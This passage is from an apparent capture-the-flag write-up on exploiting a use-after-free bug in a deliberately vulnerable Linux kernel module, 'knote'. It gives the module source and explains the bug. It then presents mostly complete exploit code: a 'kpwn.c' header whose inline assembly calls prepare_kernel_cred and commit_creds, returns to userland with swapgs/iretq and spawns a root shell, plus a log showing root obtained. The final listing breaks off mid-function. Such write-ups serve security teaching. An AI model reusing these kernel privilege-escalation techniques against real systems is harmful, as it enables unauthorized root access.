static struct file_operations knote_fops = {
    .unlocked_ioctl = knote_ioctl
};

struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};

struct knote_user {
    unsigned long idx;
    char * data;
    size_t len;
};

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};

struct knote *knotes[10];

void knote_encrypt(char * data, size_t len) {
    int i;
    for(i = 0; i &lt; len; ++i)
        data[i] ^= 0xaa;
}

void knote_decrypt(char *data, size_t len) {
    knote_encrypt(data, len);
}

static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;
    switch(cmd) {
        case KNOTE_CREATE:
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            if(data == NULL || knotes[ku.idx] == NULL) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -ENOMEM;
            }

            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        case KNOTE_DELETE:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            knotes[ku.idx] = NULL;
            break;
        case KNOTE_READ:
            if(ku.idx &gt;= 10 || !knotes[ku.idx] || ku.len &gt; knotes[ku.idx]-&gt;len) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            if(copy_to_user(ku.data, knotes[ku.idx]-&gt;data, ku.len)) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            break;
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         case KNOTE_DECRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            knotes[ku.idx]-&gt;decrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}

static int __init init_knote(void) {
    major = register_chrdev(0, DEVICE_NAME, &amp;knote_fops);
    if(major &lt; 0)
        return -1;

    knote_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(knote_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    knote_device = device_create(knote_class, 0, MKDEV(major, 0), 0, DEVICE_NAME);
    if (IS_ERR(knote_device))
    {
        class_destroy(knote_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    return 0;
}

static void __exit exit_knote(void)
{
    device_destroy(knote_class, MKDEV(major, 0));
    class_unregister(knote_class);
    class_destroy(knote_class);
    unregister_chrdev(major, DEVICE_NAME);
}

module_init(init_knote);
module_exit(exit_knote);
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Knote.c sourceode</span></p></figcaption></figure><p>The first thing that the kernel calls in a newly inserted module (c.q. <code>knote.ko</code>) is the function with keyword <code>__init</code>, which in this case belongs to the following init functions:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int __init init_knote(void) {
    major = register_chrdev(0, DEVICE_NAME, &amp;knote_fops);
    if(major &lt; 0)
        return -1;

    knote_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(knote_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    knote_device = device_create(knote_class, 0, MKDEV(major, 0), 0, DEVICE_NAME);
    if (IS_ERR(knote_device))
    {
        class_destroy(knote_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">First function called in the kmodule</span></p></figcaption></figure><p>As we can see, it registers a character device (<code>chrdev</code>) with the name &quot;knote&quot; and it enables the device operation <code>unlocked_iotctl</code>, which means that it&apos;s possible to interact with the device using <code>ioctl()</code>.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">static struct file_operations knote_fops = {
    .unlocked_ioctl = knote_ioctl
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Knote.ko file operations</span></p></figcaption></figure><p>This means that our only userland form of messing with the kmodule is using <code>ioctl()</code> to interact with the <code>knote_ioctl</code> function. As said, we need to use <code>int ioctl(int fd, unsigned long request, ...)</code> in the exploit to pass the file, cmd and arg arguments to <code>long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg)</code> . This function performs several commands: <code>KNOTE_CREATE</code>, <code>KNOTE_DELETE</code>, <code>KNOTE_READ</code>, <code>KNOTE_ENCRYPT</code> and <code>KNOTE_DECRYPT</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        case KNOTE_CREATE:
            // unsigned values
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;

            // create knote
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            if(data == NULL || knotes[ku.idx] == NULL) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -ENOMEM;
            }

            // copy userdata to note data
            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        case KNOTE_DELETE:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            knotes[ku.idx] = NULL;
            break;
        case KNOTE_READ:
            if (ku.idx &gt;= 10 || !knotes[ku.idx] || ku.len &gt; knotes[ku.idx]-&gt;len)
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            
            if (copy_to_user(ku.data, knotes[ku.idx]-&gt;data, ku.len)) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            break;
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         case KNOTE_DECRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;decrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>knote_ioctl()</span></code><span style="white-space: pre-wrap;"> - used for interacting throug </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ioctl()</span></code></p></figcaption></figure><p>As we can read, the <code>arg</code> parameter is used to supply values to a <code>knote_user</code> object, using <code>copy_from_user(&amp;ku, arg, sizeof(struct knote_user))</code>: copies <code>sizeof(struct knote_user)</code> bytes from userland pointer <code>arg</code> to kernel pointer <code>ko</code>. Secondly, it executes one of the <code>KNOTE_&lt;CMD&gt;</code> cases. </p><h2 id="finding-primitives">Finding primitives</h2><p>The first step of exploit development is identifying protections: earlier we found out that there&apos;s no active kernel protections (no kaslr, no smap, no smep, et cetera). Next, there&apos;s finding exploit primitives: let&apos;s start off with finding execution flow hijacking. Firstly I checked for any forms of buffer overflow bugs on the stack and on the heap, but I couldn&apos;t find anything. However, once I took a look at <code>KNOTE_CREATE</code>, I saw that a use-after-free bug can be triggered. </p><h3 id="finding-a-memory-corruption-bug">Finding a memory corruption bug</h3><p>The <code>KNOTE_CREATE</code> command allocates a knote and it&apos;s data using <code>kmalloc</code>, which stands for <strong>k</strong>ernel <strong>malloc</strong>. Then, it tries to copy the userland data to the kernel note data. However if that copy fails, it will <code>kfree</code> (<strong>k</strong>ernel <strong>free</strong>) both the kernel note and the kernel notes&apos; data.</p><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        case KNOTE_CREATE:
            // unsigned values
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;

            // create knote
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            // ...
            
            // copy userdata to note data
            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        // ...
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><p>Before we dive into the details, please realize that the kernel heap cache works like a stack containing heap chunk pointers: you push them with kfree and pop them with kmalloc </p><p>It took me a bit of puzzling but I figured out that we can leverage this to trigger a <strong>use-after-free</strong> (UAF) bug. If we create a knote that fails <code>copy_from_user</code> by providing an invalid pointer, the kmodule will <code>kfree(data)</code> and after that it will <code>kfree(knote)</code> but it <strong>wont reset </strong><code>knotes[ku.idx] = NULL</code>. Additionally, the allocation is in the wrong order of <code>kmalloc(data)</code> and then <code>kmalloc(knote)</code>. Because of this, a weird UAF scenario arises in the kernel memory cache where we can overwrite <code>knotes[ku.idx]</code> with userland <code>ku.data</code>. For clarification of this mindboggling bug I have made the following diagram:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2023/01/image-1.png" class="kg-image" alt loading="lazy" width="1668" height="317" srcset="https://pwning.tech/content/images/size/w600/2023/01/image-1.png 600w, https://pwning.tech/content/images/size/w1000/2023/01/image-1.png 1000w, https://pwning.tech/content/images/size/w1600/2023/01/image-1.png 1600w, https://pwning.tech/content/images/2023/01/image-1.png 1668w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Description of th UAF bug</span></figcaption></figure><h3 id="finding-a-way-to-hijack-execution-flow">Finding a way to hijack execution flow</h3><p>Now we have a UAF bug, we need to find ways to get code execution by utilizing it. After analyzing more commands, I noted that the <code>KNOTE_ENCRYPT</code> command calls <code>knote-&gt;encrypt_func</code>, stored in the <code>knote</code> structure. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>knote</span></code><span style="white-space: pre-wrap;"> structure</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        // ...
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         // ...
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>KNOTE_ENCRYPT</span></code><span style="white-space: pre-wrap;"> command</span></p></figcaption></figure><p>This means that we can execute arbitrary code by committing a UAF bug, overwrite <code>knote-&gt;encrypt_func</code> and calling it. </p><h2 id="creating-an-exploit">Creating an exploit</h2><p>So now we have our primitives to get local code execution through a UAF bug in the kernel module, we can start building the exploit. Firstly, I defined a bunch of kernel module specific code, such as the structures and <code>ioctl()</code> calls to interact with the kmodule. These structures are copy/pasted from the <code>knote.c</code> file.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int FD_KNOTE;

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};


typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user_t;


typedef struct {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    knote_user_t user;
    user.idx = idx;
    user.data = data;
    user.len = len;

    int retv = ioctl(FD_KNOTE, cmd, &amp;user);
    printf(&quot;ioctl(fd=%d, cmd=0x%x, &amp;ku=%p) -&gt; %d\n&quot;, FD_KNOTE, cmd, &amp;user, retv);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The contextual part of the exploit</span></p></figcaption></figure><p>After I got all necessary kernel module code, I created the UAF code. Please ignore the <code>set_ctx_reg()</code> and <code>&amp;privesc_ctx_swp</code>  variables. As you can see, we&apos;re firstly triggering the swap by allocating a knote with an invalid data pointer so that <code>kn-&gt;data</code> becomes <code>kn</code>. Then, we&apos;re allocating our custom <code>kn</code> by passing it as <code>kn-&gt;data</code>. Please note that I&apos;m using knote index 1, and not 0 to prevent <code>encrypt_func</code> from being overwritten in the following code of <code>knote.c</code>:</p><figure class="kg-card kg-code-card"><pre><code>switch(cmd) {
    case KNOTE_CREATE:
		// copy userdata to note data
        knotes[ku.idx]-&gt;data = data;
        knotes[ku.idx]-&gt;len = ku.len;
        if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EFAULT;
        }
        knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
        knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">The code overwriting </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encrypt_func</span></code></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include &quot;kpwn.c&quot;


int FD_KNOTE;

enum knote_ioctl_cmd {
    // ...
};


typedef struct {
    // ...
} knote_user_t;


typedef struct {
    // ...
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
	// ...
}

void main()
{
    FD_KNOTE = open(&quot;/dev/knote&quot;, O_RDONLY);
    if (FD_KNOTE &lt; 0)
    {
        puts(&quot;main(): open failed&quot;);
        exit(1);
    }

    /* case KNOTE_CREATE:
     *     char *data = kmalloc(ku.len, GFP_KERNEL);
     *     knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data = data;
     *     knotes[ku.idx]-&gt;len = len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) 
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
     *
     * doesn&apos;t reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */

    puts(&quot;[*] creating note 0: fail pls&quot;);
    cmd_send(KNOTE_CREATE, 0, (void*)0x1337, 32);
 
    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = &quot;idc3&quot;;
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf(&quot;[*] new knote_t size: %lu\n&quot;, sizeof(knote_t));
    puts(&quot;[*] allocating malicious payload knote&quot;);
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
    
    // ...
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The new code that triggers UAF</span></p></figcaption></figure><p>Then, we&apos;re triggering the function call to <code>encrypt_func</code> by using <code>KNOTE_ENCRYPT</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include &quot;kpwn.c&quot;


int FD_KNOTE;

enum knote_ioctl_cmd {
    // ...
};


typedef struct {
    // ...
} knote_user_t;


typedef struct {
    // ...
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    // ...
}

void main()
{
    // ...
    
    /* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;= 10 || !knotes[ku.idx]) 
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
     * 
     * trigger function call to encrypt_fun
     */
    puts(&quot;[*] calling (hopefully overwrited) encrypt function&quot;);
    cmd_send(KNOTE_ENCRYPT, 0, &quot;idc4&quot;, 5);

    puts(&quot;[-] exploit failed :(&quot;);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The code triggering the exploit</span></p></figcaption></figure><p>Now, coming back to <code>set_ctx_reg()</code> and <code>privesc_ctx_swp()</code>. When we commit the code execution attack in the kmodule, we are in <strong>kernel space </strong>whilst we want to run a shell as <strong>root</strong> in <strong>userland</strong>. In order to get our beloved shell, we need to perform a <strong>context swap</strong> from kernel to userland. Such context swaps happen with every system call being made in the kernel so it&apos;s very important. In order to keep this write-up relatively short, you can read more about context swapping in the <a href="https://medium.com/geekculture/linux-cpu-context-switch-deep-dive-764bfdae4f01" rel="noreferrer">context swapping blogpost</a> by geekculture. </p><p>Since these functions are very standard and used in most kernel pwn challenges I made it a header file:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">long prepare_kernel_cred = 0xDEADC0D3;
long commit_creds = 0xDEADC0DE;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(&quot;.intel_syntax noprefix;&quot;
            &quot;mov _proc_cs, cs;&quot;
            &quot;mov _proc_ss, ss;&quot;
            &quot;mov _proc_rsp, rsp;&quot;
            &quot;pushf;&quot; // push rflags
            &quot;pop _proc_rflags;&quot;
            &quot;.att_syntax&quot;);

    printf(&quot;[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n&quot;, _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}


void spawn_shell()
{
    puts(&quot;[+] Hello Userland!&quot;);
    int uid = getuid();
    if (uid == 0)
        printf(&quot;[+] UID: %d (root poggers)\n&quot;, uid);
    else {
        printf(&quot;[!] UID: %d (epic fail)\n&quot;, uid);
    }

    puts(&quot;[*] starting shell&quot;);
    system(&quot;/bin/sh&quot;);

    puts(&quot;[*] quitting exploit&quot;);
    exit(0); // avoid ugly segfault
}

void privesc_ctx_swp()
{
    __asm__(&quot;.intel_syntax noprefix;&quot;
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they&apos;ll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            &quot;xor rdi, rdi;&quot;
            &quot;movabs rax, prepare_kernel_cred;&quot;
            &quot;call rax;&quot; // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            &quot;mov rdi, rax;&quot; // RAX contains cred pointer
            &quot;movabs rax, commit_creds;&quot;
            &quot;call rax;&quot;

            // setup the context swapping
            &quot;swapgs;&quot; // swap GS to userland

            &quot;mov r15, _proc_ss;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rsp;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rflags;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_cs;&quot;
            &quot;push r15;&quot;
            &quot;lea r15, spawn_shell;&quot; // lea rip, spawn_shell ; when returning to userland
            &quot;push r15;&quot;
            &quot;iretq;&quot; // swap context to userland
            &quot;.att_syntax;&quot;);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Content of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>kpwn.c</span></code></p></figcaption></figure><p>Basically in a nutshell, the context swap requires the registers <code>ss</code>, <code>rsp</code>, <code>rflags</code> and <code>cs</code> <strong>from userland</strong>, since they are mission critical for returning to userland context. We store those registers in the <code>set_ctx_reg()</code> function:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(&quot;.intel_syntax noprefix;&quot;
            &quot;mov _proc_cs, cs;&quot;
            &quot;mov _proc_ss, ss;&quot;
            &quot;mov _proc_rsp, rsp;&quot;
            &quot;pushf;&quot; // push rflags
            &quot;pop _proc_rflags;&quot;
            &quot;.att_syntax&quot;);

    printf(&quot;[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n&quot;, _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>set_ctx_reg()</span></code><span style="white-space: pre-wrap;"> content</span></p></figcaption></figure><p>After we set them, we can use our own privesc and context swap function which also sets the new userland execution pointer. Keep in mind that the following code snippet uses global variables in the assembly. The code starts off by calling <code>prepare_kernel_cred(0)</code> (which prepares the credentials to be set to UID 0 and GID 0) and then calls <code>commit_creds(creds)</code> to set the process credentials indefinitely. At last, it prepares the context swap registers and performs the context swap.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void privesc_ctx_swp()
{
    __asm__(&quot;.intel_syntax noprefix;&quot;
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they&apos;ll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            &quot;xor rdi, rdi;&quot;
            &quot;movabs rax, prepare_kernel_cred;&quot;
            &quot;call rax;&quot; // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            &quot;mov rdi, rax;&quot; // RAX contains cred pointer
            &quot;movabs rax, commit_creds;&quot;
            &quot;call rax;&quot;

            // setup the context swapping
            &quot;swapgs;&quot; // swap GS to userland

            &quot;mov r15, _proc_ss;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rsp;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rflags;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_cs;&quot;
            &quot;push r15;&quot;
            &quot;lea r15, spawn_shell;&quot; // lea rip, spawn_shell ; when returning to userland
            &quot;push r15;&quot;
            &quot;iretq;&quot; // swap context to userland
            &quot;.att_syntax;&quot;);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>privesc_ctx_swp()</span></code><span style="white-space: pre-wrap;"> function</span></p></figcaption></figure><p>This sets the new RIP to <code>spawn_shell</code>, which contains our userland code to spawn a shell:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void spawn_shell()
{
    puts(&quot;[+] Hello Userland!&quot;);
    int uid = getuid();
    if (uid == 0)
        printf(&quot;[+] UID: %d (root poggers)\n&quot;, uid);
    else {
        printf(&quot;[!] UID: %d (epic fail)\n&quot;, uid);
    }

    puts(&quot;[*] starting shell&quot;);
    system(&quot;/bin/sh&quot;);

    puts(&quot;[*] quitting exploit&quot;);
    exit(0); // avoid ugly segfault
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>spawn_shell()</span></code><span style="white-space: pre-wrap;"> function which calls /bin/sh from userland</span></p></figcaption></figure><p>In our exploit we prepared the userland context registers, made a fake UAF knote object that would trigger <code>privesc_ctx_swp</code>, and set the addresses for the kernel functions <code>prepare_kernel_cred</code> and <code>commit_creds</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = &quot;idc3&quot;;
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf(&quot;[*] new knote_t size: %lu\n&quot;, sizeof(knote_t));
    puts(&quot;[*] allocating malicious payload knote&quot;);
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
</code></pre><figcaption><p><span style="white-space: pre-wrap;">A subsection of the exploit which sets the privesc up</span></p></figcaption></figure><p>Then, I tested the exploit locally by compiling it using <code>compress.sh</code> (given earlier in this post):</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">~ $ whoami
user
~ $ /exploit
exploit         exploit_easy    exploit_easy.c  exploit_real.c
~ $ /exploit_easy
[*] creating note 0: fail pls
ioctl(fd=3, cmd=0x1337, &amp;ku=0x7fff3d3605c0) -&gt; -1
[+] CS: 0x33, SS: 0x2b, RSP: 0x7fff3d3605e0, RFLAGS: 0x246
[*] new knote_t size: 32
[*] allocating malicious payload knote
ioctl(fd=3, cmd=0x1337, &amp;ku=0x7fff3d3605c0) -&gt; 0
[*] calling (hopefully overwrited) encrypt function
[+] Hello Userland!
[+] UID: 0 (root poggers)
[*] starting shell
/bin/sh: can&apos;t access tty; job control turned off
/home/user # whoami
root
/home/user #</code></pre><figcaption><p><span style="white-space: pre-wrap;">Exploit proof-of-concept (PoC)</span></p></figcaption></figure><p>If you want to try the exploit yourself, here&apos;s the complete source code for <code>exploit.c</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include &quot;kpwn.c&quot;


int FD_KNOTE;

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};


typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user_t;


typedef struct {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    knote_user_t user;
    user.idx = idx;
    user.data = data;
    user.len = len;

    int retv = ioctl(FD_KNOTE, cmd, &amp;user);
    printf(&quot;ioctl(fd=%d, cmd=0x%x, &amp;ku=%p) -&gt; %d\n&quot;, FD_KNOTE, cmd, &amp;user, retv);
}

void main()
{
